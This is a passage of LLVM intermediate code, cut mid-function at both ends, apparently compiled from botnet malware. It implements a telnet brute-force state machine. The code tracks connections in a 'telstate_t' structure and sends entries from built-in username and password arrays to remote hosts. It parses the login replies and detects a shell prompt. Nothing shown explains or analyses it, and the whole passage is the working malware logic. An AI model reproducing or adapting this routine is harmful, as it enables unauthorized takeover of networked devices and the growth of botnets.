  %97 = zext i32 %96 to i64
  %98 = shl i64 1, %97
  %99 = sdiv i32 %95, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %103 = or i64 %98, %102
  store i64 %103, i64* %101, align 8
  store i64 0, i64* %32, align 8
  store i64 10000, i64* %26, align 8
  %104 = load i32, i32* %94, align 16
  %105 = add nsw i32 %104, 1
  %106 = call i32 @select(i32 %105, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %106, label %126 [
    i32 1, label %107
    i32 -1, label %122
  ]

; <label>:107:                                    ; preds = %92
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %108 = load i32, i32* %94, align 16
  %109 = call i32 @getsockopt(i32 %108, i32 1, i32 4, i8* nonnull %33, i32* nonnull %3) #3
  %110 = load i32, i32* %4, align 4
  %111 = icmp eq i32 %110, 0
  %112 = load i32, i32* %94, align 16
  br i1 %111, label %115, label %113

; <label>:113:                                    ; preds = %107
  %114 = call i32 @sclose(i32 %112)
  br label %.sink.split

; <label>:115:                                    ; preds = %107
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null) #3
  %117 = and i32 %116, -2049
  %118 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i32 %117) #3
  store i32 0, i32* %87, align 4
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  store i16 0, i16* %119, align 16
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %121 = load i8*, i8** %120, align 8
  call void @llvm.memset.p0i8.i64(i8* %121, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %36, align 8
  br label %597

; <label>:122:                                    ; preds = %92
  %123 = load i32, i32* %94, align 16
  %124 = call i32 @sclose(i32 %123)
  br label %.sink.split

.sink.split:                                      ; preds = %113, %122
  store i8 0, i8* %36, align 8
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %125, align 1
  br label %126

; <label>:126:                                    ; preds = %92, %.sink.split
  %127 = load i32, i32* %87, align 4
  %128 = add i32 %127, 10
  %129 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %130 = icmp ult i32 %128, %129
  br i1 %130, label %131, label %597

; <label>:131:                                    ; preds = %126
  %132 = load i32, i32* %94, align 16
  %133 = call i32 @sclose(i32 %132)
  store i8 0, i8* %36, align 8
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %134, align 1
  br label %597

; <label>:135:                                    ; preds = %.lr.ph
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %140, i32* %136, align 4
  br label %141

; <label>:141:                                    ; preds = %139, %135
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %143 = load i32, i32* %142, align 16
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %147 = load i16, i16* %146, align 16
  %148 = zext i16 %147 to i32
  %149 = call i32 @readUntil(i32 %143, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %145, i32 1024, i32 %148)
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %155, label %151

; <label>:151:                                    ; preds = %141
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %152 = load i8*, i8** %144, align 8
  %153 = call i8* @strstr(i8* %152, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #14
  %154 = icmp ne i8* %153, null
  %.sink = select i1 %154, i8 5, i8 3
  store i8 %.sink, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %152, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:155:                                    ; preds = %141
  %156 = load i32, i32* %142, align 16
  %157 = load i8*, i8** %144, align 8
  %158 = load i16, i16* %146, align 16
  %159 = zext i16 %158 to i32
  %160 = call i32 @readUntil(i32 %156, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %157, i32 1024, i32 %159)
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %164, label %162

; <label>:162:                                    ; preds = %155
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %163 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %36, align 8
  br label %597

; <label>:164:                                    ; preds = %155
  %165 = load i32, i32* %142, align 16
  %166 = load i8*, i8** %144, align 8
  %167 = load i16, i16* %146, align 16
  %168 = zext i16 %167 to i32
  %169 = call i32 @readUntil(i32 %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %166, i32 1024, i32 %168)
  %170 = icmp eq i32 %169, 0
  br i1 %170, label %173, label %171

; <label>:171:                                    ; preds = %164
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %172 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %172, i8 0, i64 1024, i32 1, i1 false)
  store i8 5, i8* %36, align 8
  br label %597

; <label>:173:                                    ; preds = %164
  %174 = load i32, i32* %142, align 16
  %175 = load i8*, i8** %144, align 8
  %176 = load i16, i16* %146, align 16
  %177 = zext i16 %176 to i32
  %178 = call i32 @readUntil(i32 %174, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %175, i32 1024, i32 %177)
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %182, label %180

; <label>:180:                                    ; preds = %173
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %181 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %181, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %36, align 8
  br label %597

; <label>:182:                                    ; preds = %173
  %183 = load i32, i32* %142, align 16
  %184 = load i8*, i8** %144, align 8
  %185 = load i16, i16* %146, align 16
  %186 = zext i16 %185 to i32
  %187 = call i32 @readUntil(i32 %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %184, i32 1024, i32 %186)
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %191, label %189

; <label>:189:                                    ; preds = %182
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %190 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %190, i8 0, i64 1024, i32 1, i1 false)
  store i8 5, i8* %36, align 8
  br label %597

; <label>:191:                                    ; preds = %182
  %192 = load i8*, i8** %144, align 8
  %193 = call i64 @strlen(i8* %192) #14
  %194 = trunc i64 %193 to i16
  store i16 %194, i16* %146, align 16
  %195 = load i32, i32* %136, align 4
  %196 = add i32 %195, 10
  %197 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %198 = icmp ult i32 %196, %197
  br i1 %198, label %199, label %597

; <label>:199:                                    ; preds = %191
  %200 = load i32, i32* %142, align 16
  %201 = call i32 @sclose(i32 %200)
  store i8 0, i8* %36, align 8
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %202, align 1
  br label %597

; <label>:203:                                    ; preds = %.lr.ph
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %207 = load i8, i8* %206, align 2
  %208 = zext i8 %207 to i64
  %209 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %208
  %210 = load i8*, i8** %209, align 8
  %211 = call i64 @strlen(i8* %210) #14
  %212 = call i64 @send(i32 %205, i8* %210, i64 %211, i32 16384) #3
  %213 = icmp slt i64 %212, 0
  %214 = load i32, i32* %204, align 16
  br i1 %213, label %215, label %218

; <label>:215:                                    ; preds = %203
  %216 = call i32 @sclose(i32 %214)
  store i8 0, i8* %36, align 8
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %217, align 1
  br label %597

; <label>:218:                                    ; preds = %203
  %219 = call i64 @send(i32 %214, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %220 = icmp slt i64 %219, 0
  br i1 %220, label %221, label %225

; <label>:221:                                    ; preds = %218
  %222 = load i32, i32* %204, align 16
  %223 = call i32 @sclose(i32 %222)
  store i8 0, i8* %36, align 8
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %224, align 1
  br label %597

; <label>:225:                                    ; preds = %218
  store i8 4, i8* %36, align 8
  br label %597

; <label>:226:                                    ; preds = %.lr.ph
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %232

; <label>:230:                                    ; preds = %226
  %231 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %231, i32* %227, align 4
  br label %232

; <label>:232:                                    ; preds = %230, %226
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %234 = load i32, i32* %233, align 16
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %236 = load i8*, i8** %235, align 8
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %238 = load i16, i16* %237, align 16
  %239 = zext i16 %238 to i32
  %240 = call i32 @readUntil(i32 %234, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %236, i32 1024, i32 %239)
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %246, label %242

; <label>:242:                                    ; preds = %232
  store i32 0, i32* %227, align 4
  store i16 0, i16* %237, align 16
  %243 = load i8*, i8** %235, align 8
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #14
  %245 = icmp ne i8* %244, null
  %.sink3 = select i1 %245, i8 5, i8 7
  store i8 %.sink3, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %243, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:246:                                    ; preds = %232
  %247 = load i32, i32* %233, align 16
  %248 = load i8*, i8** %235, align 8
  %249 = load i16, i16* %237, align 16
  %250 = zext i16 %249 to i32
  %251 = call i32 @readUntil(i32 %247, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %248, i32 1024, i32 %250)
  %252 = icmp eq i32 %251, 0
  br i1 %252, label %257, label %253

; <label>:253:                                    ; preds = %246
  store i32 0, i32* %227, align 4
  store i16 0, i16* %237, align 16
  %254 = load i8*, i8** %235, align 8
  %255 = call i8* @strstr(i8* %254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #14
  %256 = icmp ne i8* %255, null
  %.sink4 = select i1 %256, i8 5, i8 7
  store i8 %.sink4, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %254, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:257:                                    ; preds = %246
  %258 = load i8*, i8** %235, align 8
  %259 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %260 = icmp eq i8* %259, null
  br i1 %260, label %265, label %261

; <label>:261:                                    ; preds = %257
  %262 = load i32, i32* %233, align 16
  %263 = call i32 @sclose(i32 %262)
  store i8 0, i8* %36, align 8
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %264, align 1
  br label %597

; <label>:265:                                    ; preds = %257
  %266 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %267 = icmp eq i8* %266, null
  br i1 %267, label %272, label %268

; <label>:268:                                    ; preds = %265
  %269 = load i32, i32* %233, align 16
  %270 = call i32 @sclose(i32 %269)
  store i8 0, i8* %36, align 8
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %271, align 1
  br label %597

; <label>:272:                                    ; preds = %265
  %273 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %274 = icmp eq i8* %273, null
  br i1 %274, label %279, label %275

; <label>:275:                                    ; preds = %272
  %276 = load i32, i32* %233, align 16
  %277 = call i32 @sclose(i32 %276)
  store i8 0, i8* %36, align 8
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %278, align 1
  br label %597

; <label>:279:                                    ; preds = %272
  %280 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %281 = icmp eq i8* %280, null
  br i1 %281, label %286, label %282

; <label>:282:                                    ; preds = %279
  %283 = load i32, i32* %233, align 16
  %284 = call i32 @sclose(i32 %283)
  store i8 0, i8* %36, align 8
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %285, align 1
  br label %597

; <label>:286:                                    ; preds = %279
  %287 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %288 = icmp eq i8* %287, null
  br i1 %288, label %293, label %289

; <label>:289:                                    ; preds = %286
  %290 = load i32, i32* %233, align 16
  %291 = call i32 @sclose(i32 %290)
  store i8 0, i8* %36, align 8
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %292, align 1
  br label %597

; <label>:293:                                    ; preds = %286
  %294 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %295 = icmp eq i8* %294, null
  br i1 %295, label %300, label %296

; <label>:296:                                    ; preds = %293
  %297 = load i32, i32* %233, align 16
  %298 = call i32 @sclose(i32 %297)
  store i8 0, i8* %36, align 8
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %299, align 1
  br label %597

; <label>:300:                                    ; preds = %293
  %301 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %302 = icmp eq i8* %301, null
  br i1 %302, label %307, label %303

; <label>:303:                                    ; preds = %300
  %304 = load i32, i32* %233, align 16
  %305 = call i32 @sclose(i32 %304)
  store i8 0, i8* %36, align 8
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %306, align 1
  br label %597

; <label>:307:                                    ; preds = %300
  %308 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %309 = icmp eq i8* %308, null
  br i1 %309, label %314, label %310

; <label>:310:                                    ; preds = %307
  %311 = load i32, i32* %233, align 16
  %312 = call i32 @sclose(i32 %311)
  store i8 0, i8* %36, align 8
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %313, align 1
  br label %597

; <label>:314:                                    ; preds = %307
  %315 = call i64 @strlen(i8* %258) #14
  %316 = trunc i64 %315 to i16
  store i16 %316, i16* %237, align 16
  %317 = load i32, i32* %227, align 4
  %318 = add i32 %317, 10
  %319 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %320 = icmp ult i32 %318, %319
  br i1 %320, label %321, label %597

; <label>:321:                                    ; preds = %314
  %322 = load i32, i32* %233, align 16
  %323 = call i32 @sclose(i32 %322)
  store i8 0, i8* %36, align 8
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %324, align 1
  br label %597

; <label>:325:                                    ; preds = %.lr.ph
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %327 = load i32, i32* %326, align 16
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %329 = load i8, i8* %328, align 1
  %330 = zext i8 %329 to i64
  %331 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %330
  %332 = load i8*, i8** %331, align 8
  %333 = call i64 @strlen(i8* %332) #14
  %334 = call i64 @send(i32 %327, i8* %332, i64 %333, i32 16384) #3
  %335 = icmp slt i64 %334, 0
  %336 = load i32, i32* %326, align 16
  br i1 %335, label %337, label %340

; <label>:337:                                    ; preds = %325
  %338 = call i32 @sclose(i32 %336)
  store i8 0, i8* %36, align 8
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %339, align 1
  br label %597

; <label>:340:                                    ; preds = %325
  %341 = call i64 @send(i32 %336, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %342 = icmp slt i64 %341, 0
  br i1 %342, label %343, label %347

; <label>:343:                                    ; preds = %340
  %344 = load i32, i32* %326, align 16
  %345 = call i32 @sclose(i32 %344)
  store i8 0, i8* %36, align 8
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %346, align 1
  br label %597

; <label>:347:                                    ; preds = %340
  store i8 6, i8* %36, align 8
  br label %597

; <label>:348:                                    ; preds = %.lr.ph
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %350 = load i32, i32* %349, align 4
  %351 = icmp eq i32 %350, 0
  br i1 %351, label %352, label %354

; <label>:352:                                    ; preds = %348
  %353 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %353, i32* %349, align 4
  br label %354

; <label>:354:                                    ; preds = %352, %348
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %356 = load i32, i32* %355, align 16
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %358 = load i8*, i8** %357, align 8
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %360 = load i16, i16* %359, align 16
  %361 = zext i16 %360 to i32
  %362 = call i32 @readUntil(i32 %356, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %358, i32 1024, i32 %361)
  %363 = icmp eq i32 %362, 0
  br i1 %363, label %381, label %364

; <label>:364:                                    ; preds = %354
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %365 = load i8*, i8** %357, align 8
  %366 = call i8* @strstr(i8* %365, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %367 = icmp eq i8* %366, null
  br i1 %367, label %372, label %368

; <label>:368:                                    ; preds = %364
  call void @llvm.memset.p0i8.i64(i8* %365, i8 0, i64 1024, i32 1, i1 false)
  %369 = load i32, i32* %355, align 16
  %370 = call i32 @sclose(i32 %369)
  store i8 0, i8* %36, align 8
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %371, align 1
  br label %597

; <label>:372:                                    ; preds = %364
  %373 = call i32 @matchPrompt(i8* %365)
  %374 = icmp eq i32 %373, 0
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %372
  call void @llvm.memset.p0i8.i64(i8* %365, i8 0, i64 1024, i32 1, i1 false)
  %376 = load i32, i32* %355, align 16
  %377 = call i32 @sclose(i32 %376)
  store i8 0, i8* %36, align 8
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %378, align 1
  br label %597

; <label>:379:                                    ; preds = %372
  store i8 7, i8* %36, align 8
  %380 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %380, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:381:                                    ; preds = %354
  %382 = load i32, i32* %355, align 16
  %383 = load i8*, i8** %357, align 8
  %384 = load i16, i16* %359, align 16
  %385 = zext i16 %384 to i32
  %386 = call i32 @readUntil(i32 %382, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %383, i32 1024, i32 %385)
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %405, label %388

; <label>:388:                                    ; preds = %381
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %389 = load i8*, i8** %357, align 8
  %390 = call i8* @strstr(i8* %389, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %391 = icmp eq i8* %390, null
  br i1 %391, label %396, label %392

; <label>:392:                                    ; preds = %388
  call void @llvm.memset.p0i8.i64(i8* %389, i8 0, i64 1024, i32 1, i1 false)
  %393 = load i32, i32* %355, align 16
  %394 = call i32 @sclose(i32 %393)
  store i8 0, i8* %36, align 8
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %395, align 1
  br label %597

; <label>:396:                                    ; preds = %388
  %397 = call i32 @matchPrompt(i8* %389)
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %399, label %403

; <label>:399:                                    ; preds = %396
  call void @llvm.memset.p0i8.i64(i8* %389, i8 0, i64 1024, i32 1, i1 false)
  %400 = load i32, i32* %355, align 16
  %401 = call i32 @sclose(i32 %400)
  store i8 0, i8* %36, align 8
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %402, align 1
  br label %597

; <label>:403:                                    ; preds = %396
  store i8 7, i8* %36, align 8
  %404 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %404, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:405:                                    ; preds = %381
  %406 = load i32, i32* %355, align 16
  %407 = load i8*, i8** %357, align 8
  %408 = load i16, i16* %359, align 16
  %409 = zext i16 %408 to i32
  %410 = call i32 @readUntil(i32 %406, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %407, i32 1024, i32 %409)
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %429, label %412

; <label>:412:                                    ; preds = %405
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %413 = load i8*, i8** %357, align 8
  %414 = call i8* @strstr(i8* %413, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %415 = icmp eq i8* %414, null
  br i1 %415, label %420, label %416

; <label>:416:                                    ; preds = %412
  call void @llvm.memset.p0i8.i64(i8* %413, i8 0, i64 1024, i32 1, i1 false)
  %417 = load i32, i32* %355, align 16
  %418 = call i32 @sclose(i32 %417)
  store i8 0, i8* %36, align 8
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %419, align 1
  br label %597

; <label>:420:                                    ; preds = %412
  %421 = call i32 @matchPrompt(i8* %413)
  %422 = icmp eq i32 %421, 0
  br i1 %422, label %423, label %427

; <label>:423:                                    ; preds = %420
  call void @llvm.memset.p0i8.i64(i8* %413, i8 0, i64 1024, i32 1, i1 false)
  %424 = load i32, i32* %355, align 16
  %425 = call i32 @sclose(i32 %424)
  store i8 0, i8* %36, align 8
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %426, align 1
  br label %597

; <label>:427:                                    ; preds = %420
  store i8 7, i8* %36, align 8
  %428 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %428, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:429:                                    ; preds = %405
  %430 = load i32, i32* %355, align 16
  %431 = load i8*, i8** %357, align 8
  %432 = load i16, i16* %359, align 16
  %433 = zext i16 %432 to i32
  %434 = call i32 @readUntil(i32 %430, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %431, i32 1024, i32 %433)
  %435 = icmp eq i32 %434, 0
  br i1 %435, label %453, label %436

; <label>:436:                                    ; preds = %429
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %437 = load i8*, i8** %357, align 8
  %438 = call i8* @strstr(i8* %437, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %439 = icmp eq i8* %438, null
  br i1 %439, label %444, label %440

; <label>:440:                                    ; preds = %436
  call void @llvm.memset.p0i8.i64(i8* %437, i8 0, i64 1024, i32 1, i1 false)
  %441 = load i32, i32* %355, align 16
  %442 = call i32 @sclose(i32 %441)
  store i8 0, i8* %36, align 8
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %443, align 1
  br label %597

; <label>:444:                                    ; preds = %436
  %445 = call i32 @matchPrompt(i8* %437)
  %446 = icmp eq i32 %445, 0
  br i1 %446, label %447, label %451

; <label>:447:                                    ; preds = %444
  call void @llvm.memset.p0i8.i64(i8* %437, i8 0, i64 1024, i32 1, i1 false)
  %448 = load i32, i32* %355, align 16
  %449 = call i32 @sclose(i32 %448)
  store i8 0, i8* %36, align 8
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %450, align 1
  br label %597

; <label>:451:                                    ; preds = %444
  store i8 7, i8* %36, align 8
  %452 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %452, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:453:                                    ; preds = %429
  %454 = load i32, i32* %355, align 16
  %455 = load i8*, i8** %357, align 8
  %456 = load i16, i16* %359, align 16
  %457 = zext i16 %456 to i32
  %458 = call i32 @readUntil(i32 %454, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %455, i32 1024, i32 %457)
  %459 = icmp eq i32 %458, 0
  br i1 %459, label %477, label %460

; <label>:460:                                    ; preds = %453
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %461 = load i8*, i8** %357, align 8
  %462 = call i8* @strstr(i8* %461, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %463 = icmp eq i8* %462, null
  br i1 %463, label %468, label %464

; <label>:464:                                    ; preds = %460
  call void @llvm.memset.p0i8.i64(i8* %461, i8 0, i64 1024, i32 1, i1 false)
  %465 = load i32, i32* %355, align 16
  %466 = call i32 @sclose(i32 %465)
  store i8 0, i8* %36, align 8
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %467, align 1
  br label %597

; <label>:468:                                    ; preds = %460
  %469 = call i32 @matchPrompt(i8* %461)
  %470 = icmp eq i32 %469, 0
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %468
  call void @llvm.memset.p0i8.i64(i8* %461, i8 0, i64 1024, i32 1, i1 false)
  %472 = load i32, i32* %355, align 16
  %473 = call i32 @sclose(i32 %472)
  store i8 0, i8* %36, align 8
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %474, align 1
  br label %597

; <label>:475:                                    ; preds = %468
  store i8 7, i8* %36, align 8
  %476 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %476, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:477:                                    ; preds = %453
  %478 = load i32, i32* %355, align 16
  %479 = load i8*, i8** %357, align 8
  %480 = load i16, i16* %359, align 16
  %481 = zext i16 %480 to i32
  %482 = call i32 @readUntil(i32 %478, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %479, i32 1024, i32 %481)
  %483 = icmp eq i32 %482, 0
